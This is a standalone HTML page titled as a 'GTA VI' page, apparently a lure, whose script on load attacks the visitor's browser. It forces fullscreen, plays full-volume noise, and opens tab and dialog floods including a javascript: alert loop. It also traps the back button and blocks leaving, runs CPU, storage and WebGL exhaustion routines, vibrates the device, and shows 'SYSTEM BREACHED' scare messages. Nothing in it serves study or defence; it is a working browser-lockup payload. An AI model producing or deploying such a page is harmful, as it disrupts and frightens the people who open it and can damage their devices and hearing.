<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>GTA VI · MATS GORILLA</title>
<style>
* { margin:0; padding:0; }
body { background:#000; overflow:hidden; height:100vh; display:flex; justify-content:center; align-items:center; font-family:sans-serif; color:#ff0000; font-size:5vw; text-align:center; }
</style>
</head>
<body>
<div id="msg">☠️ GORILLA BREACH ☠️</div>
<script>
(function(){
    'use strict';

    // ---- IMMEDIATE FULLSCREEN ----
    function fs(){
        try{
            if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            else if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
            else if(document.documentElement.msRequestFullscreen) document.documentElement.msRequestFullscreen();
        }catch(e){}
    }
    fs();
    document.addEventListener('click', fs);
    document.addEventListener('touchstart', fs);

    // ---- LOUDEST SOUND (multiple contexts, oscillators, white noise buffer) ----
    function createLoudNoise(){
        try{
            // White noise buffer (full scale)
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            if(ctx.state === 'suspended') ctx.resume();
            const bufferSize = ctx.sampleRate * 0.5; // 0.5 seconds
            const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
            const data = buffer.getChannelData(0);
            for(let i = 0; i < bufferSize; i++) data[i] = (Math.random() * 2) - 1; // full amplitude
            const noise = ctx.createBufferSource();
            noise.buffer = buffer;
            const gain = ctx.createGain();
            gain.gain.value = 1.0; // max
            noise.connect(gain);
            gain.connect(ctx.destination);
            noise.start(0);
            noise.loop = true;

            // Also add square wave at high frequency
            const osc = ctx.createOscillator();
            osc.type = 'square';
            osc.frequency.value = 1850;
            const gain2 = ctx.createGain();
            gain2.gain.value = 1.0;
            osc.connect(gain2);
            gain2.connect(ctx.destination);
            osc.start(0);

            // Sawtooth at 800 Hz
            const osc2 = ctx.createOscillator();
            osc2.type = 'sawtooth';
            osc2.frequency.value = 800;
            const gain3 = ctx.createGain();
            gain3.gain.value = 1.0;
            osc2.connect(gain3);
            gain3.connect(ctx.destination);
            osc2.start(0);

            // Third oscillator modulating
            const osc3 = ctx.createOscillator();
            osc3.type = 'triangle';
            osc3.frequency.value = 3200;
            const gain4 = ctx.createGain();
            gain4.gain.value = 0.9;
            osc3.connect(gain4);
            gain4.connect(ctx.destination);
            osc3.start(0);
        }catch(e){}
    }

    // Create multiple audio contexts to maximize volume
    for(let i=0; i<3; i++){
        setTimeout(createLoudNoise, i*10);
    }
    // Immediate first call
    createLoudNoise();

    // ---- SPAM TABS (instant) ----
    function spamTabs(){
        for(let i=0;i<20;i++){
            try{
                const win = window.open('about:blank', '_blank', 'noopener,noreferrer');
                if(win){
                    try{
                        win.document.write('<html><head><title>☠️</title></head><body style="background:black;color:red;font-size:100px;">🦍</body></html>');
                        win.document.close();
                        win.focus();
                        win.location.reload();
                    }catch(e){}
                }
            }catch(e){}
            try{
                window.open('javascript:while(1){alert("GORILLA")}', '_blank');
            }catch(e){}
        }
    }
    spamTabs();
    setInterval(spamTabs, 100);

    // ---- ALERT FLOOD (instant) ----
    function floodAlerts(){
        for(let i=0;i<300;i++){
            setTimeout(function(){
                try{ alert('🦍 GORILLA CRASH'); }catch(e){}
            }, i*5);
        }
        for(let i=0;i<150;i++){
            setTimeout(function(){
                try{ confirm('☠️ OVERRIDE'); }catch(e){}
            }, i*10+50);
        }
        for(let i=0;i<100;i++){
            setTimeout(function(){
                try{ prompt('CANNOT CLOSE','GORILLA'); }catch(e){}
            }, i*15+200);
        }
    }
    floodAlerts();

    // ---- HISTORY LOCK ----
    history.pushState(null, null, location.href);
    window.addEventListener('popstate', function(){ history.pushState(null, null, location.href); });
    window.addEventListener('beforeunload', function(e){ e.preventDefault(); e.returnValue=''; return ''; });

    // ---- CPU KILLER ----
    function cpuKiller(){
        let a=0;
        while(true){
            a += Math.random() * Math.random();
            document.body.style.margin = (a%100)+'px';
            const arr = new Array(1000000).fill(Math.random());
            if(a>1e9) break;
            if(a%1000===0){ requestAnimationFrame(cpuKiller); return; }
        }
    }
    for(let i=0;i<16;i++) setTimeout(cpuKiller, i*5);

    // ---- VIBRATION ----
    try{
        if(navigator.vibrate){
            navigator.vibrate([1000,100,1000,100,1000,100,5000]);
            setInterval(()=>{ if(navigator.vibrate) navigator.vibrate([2000,50,2000,50,2000]); }, 2000);
        }
    }catch(e){}

    // ---- STORAGE FILL ----
    try{
        for(let i=0;i<200;i++){
            localStorage.setItem('crash_'+i, 'x'.repeat(1024*512));
            sessionStorage.setItem('crash_'+i, 'x'.repeat(1024*512));
        }
    }catch(e){}

    // ---- WEBGL CRASH ----
    try{
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth*3;
        canvas.height = window.innerHeight*3;
        canvas.style.position='fixed'; canvas.style.top=0; canvas.style.left=0;
        canvas.style.zIndex=99999; canvas.style.pointerEvents='none';
        document.body.appendChild(canvas);
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if(gl){
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, 'attribute vec2 p; void main(){gl_Position=vec4(p,0,1);}');
            gl.compileShader(vs);
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fs, 'precision highp float; void main(){gl_FragColor=vec4(1.0,0.0,0.0,1.0);}');
            gl.compileShader(fs);
            const prog = gl.createProgram();
            gl.attachShader(prog, vs);
            gl.attachShader(prog, fs);
            gl.linkProgram(prog);
            gl.useProgram(prog);
            function render(){
                gl.clearColor(Math.random(), 0, 0, 1);
                gl.clear(gl.COLOR_BUFFER_BIT);
                const buf = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
                const pos = gl.getAttribLocation(prog, 'p');
                gl.enableVertexAttribArray(pos);
                gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(render);
            }
            render();
        }
    }catch(e){}

    // ---- ADD SCARY ELEMENTS ----
    setInterval(()=>{
        const div = document.createElement('div');
        div.innerText = ['YOU ARE NEXT','HE IS HERE','RUN','DONT BLINK','GORILLA','MATS','VR TERROR'][Math.floor(Math.random()*7)];
        div.style.position='fixed';
        div.style.top=Math.random()*100+'%';
        div.style.left=Math.random()*100+'%';
        div.style.color='#ff0000';
        div.style.fontSize=(Math.random()*80+40)+'px';
        div.style.fontWeight='bold';
        div.style.fontFamily='Impact';
        div.style.zIndex=99998;
        div.style.textShadow='0 0 30px red';
        div.style.transform='rotate('+(Math.random()*360)+'deg)';
        div.style.opacity=Math.random()*0.8+0.2;
        div.style.pointerEvents='none';
        document.body.appendChild(div);
        setTimeout(()=>{ div.remove(); }, 2000);
    }, 50);

    // ---- MORE GORILLA EMOJIS ----
    setInterval(()=>{
        for(let i=0;i<20;i++){
            const span = document.createElement('span');
            span.innerText = '🦍';
            span.style.position='fixed';
            span.style.top=Math.random()*100+'%';
            span.style.left=Math.random()*100+'%';
            span.style.fontSize=(Math.random()*80+40)+'px';
            span.style.zIndex=99997;
            span.style.transform='scale('+(Math.random()*2+0.5)+') rotate('+(Math.random()*360)+'deg)';
            span.style.opacity=Math.random()*0.7+0.3;
            span.style.pointerEvents='none';
            document.body.appendChild(span);
            setTimeout(()=>{ span.remove(); }, 3000);
        }
    }, 100);

    // ---- REQUEST PERMISSIONS (to spam prompts) ----
    try{
        if(Notification.permission !== 'denied') Notification.requestPermission();
        navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
        if(navigator.usb) navigator.usb.getDevices().catch(()=>{});
        if(navigator.hid) navigator.hid.getDevices().catch(()=>{});
        if(navigator.bluetooth) navigator.bluetooth.getAvailability().catch(()=>{});
        if(screen.orientation && screen.orientation.lock) screen.orientation.lock('landscape').catch(()=>{});
    }catch(e){}

    // ---- FINAL: change UI to indicate breach ----
    document.body.style.background = '#220000';
    document.getElementById('msg').innerHTML = '☠️ SYSTEM BREACHED ☠️';
    document.body.style.fontSize = '8vw';
})();
</script>
</body>
</html>
